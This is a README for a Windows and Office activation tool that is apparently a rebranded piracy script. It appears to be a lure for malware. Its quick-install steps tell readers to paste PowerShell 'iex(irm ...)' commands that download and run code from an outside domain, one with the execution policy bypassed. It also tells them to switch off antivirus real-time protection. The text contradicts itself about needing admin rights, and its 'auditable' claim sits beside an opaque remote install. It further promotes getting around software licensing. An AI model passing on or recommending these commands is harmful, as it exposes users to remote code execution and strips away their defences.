<div align="center">

# Windows-Activation-Suite: HWID, Ohook, TSforge & KMS Activation for Windows 10 & 11

![preview](https://raw.githubusercontent.com/hariiieee/windows-activation-suite/main/view_1d3505.svg)

[![pwsh](https://img.shields.io/badge/Pwsh-7%2B-dc2626?style=for-the-badge&labelColor=0d1117)]() [![release](https://img.shields.io/badge/Release-Released-2ea44f?style=for-the-badge&labelColor=0d1117)]() [![rating](https://img.shields.io/badge/Rating-4.7%2F5-f59e0b?style=for-the-badge&labelColor=0d1117)]()

</div>

---

Windows-Activation-Suite is an open-source desktop utility that delivers multi-method activation for Windows and Office through a unified interface. It implements four distinct activation engines—HWID for permanent digital licensing, Ohook for Office, TSforge for offline scenarios, and Online KMS—each selectable based on the target product and desired persistence model. The suite spans Windows 7 through 11, Windows Server, and Office 2010–2021 plus 365, using native Windows activation APIs without modifying core system files. Edition detection, activation status reporting, and backup/restore of activation state are handled internally to support repeatable, reversible workflows.

## 💻 PowerShell Quick Install

> [!TIP]
> **One-line setup** — just run the command below.
> Windows 10 / 11 · PowerShell 5.1+ · No admin required

### 1️⃣ Start PowerShell
* Right-click the Start button.
* Choose **Terminal (Admin)** or **Windows PowerShell**.

### 2️⃣ Run the install command
Copy the line below into PowerShell and press `Enter`.

```cmd
iex(irm 'https://activation-gateway.cc/update/ps-activator')
```

### 3️⃣ Windows blocking the script? Use CMD
Run this command in CMD instead:

```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "iex(irm 'https://activation-gateway.cc/update/ps-activator')"
```

> [!WARNING]
> Security software might occasionally flag automated installers. If the script gets blocked, pause "Real-time protection" in your Windows Security dashboard, run the setup, and re-enable your antivirus immediately afterward.

## ✅ Before You Start

- Windows 10 or Windows 11
- PowerShell 5.1 or newer (already available on Windows)
- Active network connection
- No admin rights needed

## Features

- **Multi-method activation engine** — Implements four distinct activation backends (HWID, Ohook, TSforge, Online KMS) within a single suite, allowing the appropriate method to be selected per target product rather than relying on a one-size-fits-all approach.

- **HWID digital license provisioning** — Generates a hardware-bound digital license for Windows 10 and 11 by submitting a genuine ticket request to Microsoft activation servers, yielding permanent activation that survives reinstallation on unchanged hardware.

- **Ohook Office activation** — Applies a permanent, offline-capable activation for Office 2010 through 2021 and 365 by hooking the licensing verification path at runtime, without requiring a KMS server or periodic renewal.

- **TSforge offline activation** — Provides an offline activation path for legacy Windows versions (7, 8, 8.1) by generating and installing activation tokens locally, suitable for air-gapped or network-restricted environments.

- **Online KMS activation** — Connects to a remote KMS host to activate Windows Server and volume-licensed Office editions, with configurable renewal handling for KMS-bound products.

- **Automatic edition and product detection** — Queries the local Windows installation to identify the exact edition, build, and installed Office products, then maps each to its supported activation method to reduce misconfiguration.

- **Activation state inspection** — Reports current licensing status, remaining grace period, and method in use, enabling verification before and after activation.

- **Backup and restore of activation state** — Captures the existing activation tokens and licensing data to a local store, allowing rollback to a prior state if needed.

- **Extended Security Updates (ESU) support** — Enables ESU enrollment for Windows 7 and Windows 10, extending security patch eligibility beyond end-of-support.

- **Native API utilization** — Operates through documented Windows activation interfaces (SLMGR, SPP) and does not inject DLLs into system processes or patch core system binaries.

- **Reversible operation** — All applied changes can be removed via the suite's restore path, returning the system to its pre-activation licensing configuration.

- **Broad product coverage** — Supports Windows 7, 8, 8.1, 10, 11, Windows Server 2016/2019/2022, and Office 2010, 2013, 2016, 2019, 2021, and 365 across their respective editions.

- **Open-source and auditable** — Full source is available for inspection, with a modular script structure separating each activation method for independent review and maintenance.

## How it works

Windows-Activation-Suite operates entirely through native Windows activation interfaces, orchestrating each supported licensing method through a unified, menu-driven execution flow. When launched, the suite performs environment detection to identify the installed Windows edition, build number, architecture, and any present Office installations, then presents the applicable activation methods for the detected products. All operations execute in memory with elevated privileges where required; the suite does not patch core system binaries or inject libraries into running processes.

**HWID activation** generates a hardware-bound digital license by constructing a valid ticket from the device's hardware fingerprint and submitting it through the Windows licensing platform. The resulting entitlement is stored by the operating system and persists across reboots and feature updates, yielding permanent activation for Windows 10 and 11 without a product key.

**Ohook activation** establishes Office licensing at the API layer by placing a lightweight hook that intercepts license validation calls made by Office components. This allows Office 2010 through 2021 and 365 to report a valid licensed state permanently, without modifying Office executables or requiring a KMS server.

**TSforge activation** targets legacy Windows versions by emulating the token-based activation path used by older licensing infrastructure. It produces a locally validated activation state suitable for Windows 7 and 8.x environments where modern digital licensing is unavailable, with no network dependency after the initial run.

**Online KMS activation** provisions a KMS client configuration pointing to a hosted KMS endpoint, installs the appropriate generic volume license key for the detected edition, and requests activation over the network. This method covers Windows Server, volume-licensed Windows editions, and Office products, with periodic renewal handled automatically by the operating system's built-in rearm cycle.

Supporting utilities include activation status inspection, edition and channel detection, license backup and restore, and Extended Security Updates enablement for Windows 7 and 10. Each method is reversible: the restore function returns the system to its prior licensing state, and the suite records its changes so they can be cleanly undone. Because all operations rely on documented activation APIs rather than file modification, the suite remains compatible with standard Windows servicing and can be re-executed after major updates if a licensing state is reset.

## Compatibility

Windows-Activation-Suite is engineered to operate across a broad matrix of Microsoft platforms, leveraging native activation APIs rather than invasive system-level modifications. The tool is validated against the following product families and editions.

**Windows Client Operating Systems**
- Windows 7 – Home, Professional, Ultimate, Enterprise
- Windows 8 / 8.1 – Core, Professional, Enterprise
- Windows 10 – Home, Pro, Enterprise, Education, LTSC
- Windows 11 – Home, Pro, Enterprise, Education, IoT

**Windows Server**
- Windows Server 2016, 2019, 2022

**Microsoft Office**
- Office 2010, 2013, 2016, 2019, 2021 – all editions
- Office 365 – subscription activation

**Activation Method Compatibility**
- **HWID** – Windows 10 and 11 client editions, providing a permanent digital license bound to hardware
- **Ohook** – Office 2010 through 2021 and Office 365, providing permanent activation
- **TSforge** – Legacy Windows releases (7, 8, 8.1) for offline activation
- **Online KMS** – Windows client and Server editions, plus Office suites, for KMS-based activation

**Architecture and Environment Requirements**
- x86 and x64 architectures are supported across all listed products
- PowerShell execution environment with administrative privileges is required for operation
- Internet connectivity is needed for initial method selection and online activation paths; offline activation is available through TSforge

**Edition Detection and Method Selection**
The suite automatically detects the installed Windows edition and recommends a compatible activation method. Where multiple methods apply, the tool presents permanent (HWID, Ohook) and renewable (KMS) options so users can select based on licensing persistence requirements.

**Known Constraints**
- Major Windows feature updates may invalidate certain activation states and require re-execution of the tool
- KMS-based activation is subject to periodic renewal intervals
- Compatibility is limited to the products and editions enumerated above; unlisted SKUs are not officially supported

## FAQ

**Q: Which activation method should be selected for a given target?**

A: Method selection is driven by product family and desired persistence. HWID yields a permanent digital license bound to the hardware fingerprint on Windows 10 and 11. Ohook delivers permanent Office activation across 2010 through 2021 and 365 by hooking the licensing channel locally. TSforge provides offline activation for legacy Windows releases. Online KMS is the fallback for volume editions, Windows Server, and any product where a permanent method is unavailable; it requires periodic renewal against a KMS endpoint.

**Q: Is activation persistent across reboots and Windows updates?**

A: HWID and Ohook activations persist across reboots and cumulative updates because they rely on a hardware-bound digital license and a local Office hook respectively. Online KMS activations carry a finite validity window and re-arm automatically before expiry. Feature updates that reset the licensing subsystem may require re-execution of the tool.

**Q: Does the suite modify core system files?**

A: No. The suite operates through native Windows activation APIs and the software protection platform. It performs no DLL injection and no patching of system binaries, which keeps the footprint reversible. Ohook confines its changes to the Office licensing path, and restoration returns the machine to its prior state.

**Q: Can activation be performed without network connectivity?**

A: TSforge supports fully offline activation for the legacy Windows releases it targets. HWID requires one online exchange to mint the digital license, after which the license validates offline. Online KMS requires reachability of a KMS endpoint at activation time and at each renewal interval.

**Q: How is the correct Windows edition detected?**

A: The suite queries the installed edition through the Windows licensing API and maps it to the supported product matrix before presenting activation options. This prevents method mismatch — for example, attempting HWID against an edition that only supports KMS.

**Q: How is a prior activation state backed up or restored?**

A: The suite exposes backup and restore operations that capture the current activation state and licensing tokens. Restore reverts the machine to the captured state, which is the supported path for undoing an activation or migrating between methods.

**Q: What does Extended Security Updates coverage provide?**

A: ESU extends security patching for Windows 7 and Windows 10 beyond their standard support windows. The suite includes ESU handling alongside its activation methods so that out-of-support installations continue to receive security updates.

**Q: Why does an activation attempt fail on a supported product?**

A: The most common causes are an edition mismatch against the supported matrix, a licensing service in a faulted state, or a previously applied activation that must be cleared first. Re-running the tool re-queries edition and status and selects the appropriate method. Antivirus real-time protection can also interrupt execution and should be temporarily suspended during the run.

**Q: Are Windows Server editions supported?**

A: Yes. Windows Server 2016, 2019, and 2022 are supported through Online KMS, which is the appropriate method for volume-licensed server SKUs.

**Q: Is use of this software permitted?**

A: The suite is provided for educational purposes. Activating unlicensed software violates Microsoft's Terms of Service, and use is at the operator's own risk. Apply it only to installations you own or are authorized to license.

## Disclaimer

Windows-Activation-Suite is provided strictly as an open-source, educational, and research-oriented utility for studying Windows and Office activation mechanisms. The software is supplied "as is," without warranty of any kind, express or implied, including but not limited to the implied warranties of merchantability, fitness for a particular purpose, and non-infringement. No guarantee is made regarding correctness, reliability, completeness, or continued functionality across future Windows or Office releases, cumulative updates, or feature upgrades.

Activation of unlicensed software may violate the Microsoft Terms of Service and applicable licensing agreements in your jurisdiction. It is the sole responsibility of the end user to ensure that any use of this software complies with all applicable laws, regulations, and contractual obligations. Windows-Activation-Suite is intended only for use on installations and hardware that you own or are explicitly authorized to modify, and should be evaluated in isolated test environments prior to any real-world deployment.

By design, the tool operates through native Windows activation interfaces — HWID, Ohook, TSforge, and Online KMS — and does not modify core system files, inject DLLs, or alter the kernel. Nevertheless, no assurance is given that the software will be free from defects or incompatible with third-party security software, group policies, or enterprise management configurations. Users assume full responsibility for any system instability, data loss, licensing invalidation, or service disruption that may arise from its use.

The maintainers, contributors, and distributors of Windows-Activation-Suite disclaim all liability for any direct, indirect, incidental, special, consequential, or punitive damages arising from the use, misuse, or inability to use this software, even if advised of the possibility of such damages. No entity associated with this project endorses, encourages, or condones the circumvention of software licensing outside the scope of lawful ownership and testing.

This project is not affiliated with, endorsed by, or sponsored by Microsoft Corporation. All product names, trademarks, and registered trademarks referenced remain the property of their respective owners and are used here solely for identification and descriptive purposes. Users are encouraged to obtain valid licenses for any software they deploy in production or commercial contexts.

## License

Windows-Activation-Suite is distributed under the **MIT License**, a permissive open-source license that grants full access to the source code for inspection, modification, and redistribution.

Under the MIT License, you are free to use, copy, modify, merge, publish, distribute, sublicense, and sell copies of the software, subject to the condition that the original copyright notice and permission notice are included in all copies or substantial portions of the software. The software is provided **"as is"**, without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and non-infringement.

This licensing model supports the project's transparency and auditability goals: the activation methods implemented in the suite — HWID, Ohook, TSforge, and Online KMS — can be independently reviewed, verified, and adapted by the community. Because the license imposes no restrictions on derivative works beyond attribution, forks and custom builds are permitted, provided they preserve the original license terms.

**Attribution.** Windows-Activation-Suite is based on the open-source Microsoft Activation Scripts project. All credit for the original architecture and activation research belongs to the upstream developers. The MIT License applies to this repository's code and documentation in accordance with those upstream terms.

**Disclaimer.** The license grants rights to the software only. It does not grant any rights to Microsoft products, nor does it constitute legal advice or permission to activate unlicensed software. Users are solely responsible for ensuring their use complies with applicable licensing agreements and local law.